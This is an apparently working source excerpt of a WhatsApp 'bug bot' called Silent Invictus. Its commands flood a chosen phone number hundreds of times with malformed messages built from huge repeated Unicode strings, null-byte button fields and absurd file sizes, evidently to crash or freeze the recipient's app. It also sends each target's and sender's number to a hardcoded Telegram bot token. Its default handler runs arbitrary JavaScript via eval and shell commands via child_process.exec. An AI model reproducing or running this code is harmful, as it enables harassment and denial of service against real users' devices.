              body: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
              mediaType: 1,
              thumbnailUrl: null,
              sourceUrl: "https://Wa.me/stickerpack/justinoffc",
              renderLargerThumbnail: true
            },
            forwardingScore: 999999,
            isForwarded: true
          },
          locationMessage: {
            degreesLatitude: 123456789,
            degreesLongitude: 987654321,
            name: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
            address: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 "
          },
          externalAdReply: {
            title: "INVALID DUPLICATE",
            body: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
            sourceUrl: "t.me/DimzNotDev"
          },
          forwardingScore: 12345,
          isForwarded: true
        }
      }
    }

    await client.relayMessage(target, message3, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    })

    console.log(chalk.red(`Silent Success Send Attack To ${target}`))
    const MakLu = '_*~@2~*_\n'.repeat(10500)
    const Private = 'ោ៝'.repeat(10000)

    const msg = {
      newsletterAdminInviteMessage: {
        newsletterJid: "1@newsletter",
        newsletterName: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ‌" + MakLu + "ោ៝".repeat(20000),
        caption: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 " + Private + "ោ៝".repeat(20000),
        inviteExpiration: "999999999",
      },
    }

    await client.relayMessage(target, msg, {
      participant: { jid: target },
      messageId: null,
    })

    const message4 = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              stanzaId: client.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 ",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption: ""
                },
              },
            },
            body: {
              text: " ⃝⃤⃞⃟⃠⃢𝗦𝗜𝗟𝗘𝗡𝗧 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 🥵🥶 " + "ꦾ".repeat(10000)
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0000".repeat(25000) },
                { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(25000) },
                { name: "cta_url", buttonParamsJson: "\u0000".repeat(25000) },
                { name: "cta_call", buttonParamsJson: "\u0000".repeat(25000) },
                { name: "cta_copy", buttonParamsJson: "\u0000".repeat(25000) },
                { name: "cta_reminder", buttonParamsJson: "\u0000".repeat(25000) },
                { name: "cta_cancel_reminder", buttonParamsJson: "\u0000".repeat(25000) },
                { name: "address_message", buttonParamsJson: "\u0000".repeat(25000) },
                { name: "send_location", buttonParamsJson: "\u0000".repeat(25000) },
                { name: "quick_reply", buttonParamsJson: "\u0000".repeat(25000) },
                { name: "mpm", buttonParamsJson: "\u0000".repeat(25000) },
              ],
            },
          },
        },
      },
    }

    await client.relayMessage(target, message4, {
      participant: { jid: target },
    })

    console.log(chalk.red(`Silent Success Send Attack To ${target}`))

  } catch (err) {
    console.log(err)
  }
}

// LAPOR
async function kirimLaporanTelegram(command, mentionedJid, botNumber) {
    try {
        const token = "8213489962:AAFqKx7D-WmaGHstJ3ChgcTaG7u3XZJRR0k"; // TOKEN BOT TELEGRAM
        const chatId = " 7734367903"; // ID CHAT TELEGRAM
        const nomorTarget = mentionedJid.split('@')[0];
        const nomorPengirim = botNumber.split('@')[0];

        const pesan = `⚠️ *Bug Alert!*
Tuan ada yg sedang melakukan bug ni

📱 Nomor Target: wa.me/${nomorTarget}
👤 Nomor Pengirim: wa.me/${nomorPengirim}
🤖 Nama Sc: Silent Invictus
🛠 Command Bugnya: ${command}`;

        await axios.get(`https://api.telegram.org/bot${token}/sendMessage`, {
            params: {
                chat_id: chatId,
                text: pesan,
                parse_mode: "Markdown"
            }
        });
    } catch (e) {
    }
}
//=================================================//
// Command Bug
//=================================================//
case 'silent-blank': {
if (!isDev && !isPremium && !isCreator) return ReplyButton(mess.premium);
if (!q) return m.reply(`Example Use.\n ${command} 62xx / @tag`)
// Verifikasi Number Target
let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return m.reply(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
}
let target = mentionedJid;
ReplyButton(`Success! ${command} sent to ${mentionedJid}`)

await kirimLaporanTelegram(command, mentionedJid, botNumber)

    for (let i = 0; i < 225; i++) {
    await SilentUixBlank(target);
    }
    console.log(chalk.red.bold(`✅ Succes! "${command}" sent to ${mentionedJid}`));
    }
break;

case 'silent-combo': {
if (!isDev && !isPremium && !isCreator) return ReplyButton(mess.premium);
if (!q) return m.reply(`Example Use.\n ${command} 62xx / @tag`)
// Verifikasi Number Target
let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return m.reply(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
}
let target = mentionedJid;
ReplyButton(`Success! ${command} sent to ${mentionedJid}`)

kirimLaporanTelegram(command, mentionedJid, botNumber)

    for (let i = 0; i < 400; i++) {
    await SilentCombobug(client, target);
    }
    console.log(chalk.red.bold(`✅ Succes! "${command}" sent to ${mentionedJid}`));
    }
break;

case 'silent-invis': {
if (!isDev && !isPremium && !isCreator) return ReplyButton(mess.premium);
if (!q) return m.reply(`Example Use.\n ${command} 62xx / @tag`)
// Verifikasi Number Target
let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return m.reply(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
}
let target = mentionedJid;
ReplyButton(`Success! ${command} sent to ${mentionedJid}`)

kirimLaporanTelegram(command, mentionedJid, botNumber)

    for (let i = 0; i < 500; i++) {
    await SilentDelayHard(client, target);
    }
    console.log(chalk.red.bold(`✅ Succes! "${command}" sent to ${mentionedJid}`));
    }
break;

default:
if (budy.startsWith('<')) {
if (!isCreator) return;
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return;
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith('$')) {
if (!isCreator) return;
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err));
}
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})